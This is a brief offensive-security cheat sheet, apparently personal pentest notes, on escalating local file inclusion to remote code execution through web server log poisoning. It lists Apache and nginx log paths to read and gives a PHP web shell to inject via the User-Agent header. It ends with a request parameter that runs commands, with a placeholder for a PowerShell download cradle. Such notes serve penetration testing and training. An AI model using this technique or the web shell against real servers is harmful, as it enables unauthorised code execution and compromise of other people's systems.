# LFI2RCE

## Via Log Files

We can first use LFI to inspect the following paths:

```bash
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```

If we view these files and see values we control inside of them (such as the `User-Agent` header), we can gain RCE by injecting a PHP web route into said value.

In the case `User-Agent` is viewable, we can add the following PHP code to our `User-Agent` header when simply accessing the site normally:

```php
<?php system($_GET['cmd']); ?>
```

We can then make a request to the log files using the LFI to see if our injected PHP code is being rendered.

If the PHP code is not viewable, and only a space is seen, we know that PHP is being evaluated by the web server.

We can then obtain RCE by adding the following to our LFI request:

```bash
&cmd=<PS_CRADLE_HERE>
```
